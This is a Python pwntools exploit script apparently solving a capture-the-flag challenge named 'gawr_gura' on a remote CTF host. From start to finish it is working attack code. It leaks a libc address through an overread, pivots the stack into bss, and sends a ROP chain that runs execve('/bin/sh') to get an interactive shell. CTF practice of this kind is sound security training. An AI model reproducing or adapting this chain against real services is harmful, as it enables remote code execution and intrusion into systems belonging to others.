#!/usr/bin/python3
# -*- coding: UTF-8 -*-
from pwn import *

context.arch = 'amd64'

# p = process('./distribute/share/gawr_gura')
p = remote('ctf.adl.tw', 10003)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


pop_rax = 0x4a550
pop_rdi = 0x26b72
pop_rsi = 0x27529
pop_rdx_pop_r12 = 0x11c371
syscall = 0x2584d

bss = 0x407f00
read_again = 0x4017CC
leave_ret = 0x40185a

p.sendlineafter(b"7.) exit\n", b"5")

p.sendafter(b"What do you want to say?\n", cyclic(0x2c))

p.sendlineafter(b"7.) exit\n", b"6")

p.recvline()

p.recv(0x2c)

libc.address = u64((p.recv(6)).strip().ljust(8, b'\x00')) - \
    libc.sym['_IO_2_1_stdout_']
success('libc base: 0x%x', libc.address)

payload = b'a'*80
payload += p64(bss)
payload += p64(read_again)

p.sendafter(b"Write on your suggestion. Thank you.\n", payload)

payload = p64(libc.address+pop_rdi)
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.address+pop_rsi)
payload += p64(0)
payload += p64(libc.address+pop_rdx_pop_r12)
payload += p64(0)
payload += p64(0)
payload += p64(libc.address+pop_rax)
payload += p64(0x3b)
payload += p64(libc.address+syscall)
payload += p64(bss-0x58)
payload += p64(leave_ret)

p.sendline(payload)

p.interactive()
p.close()
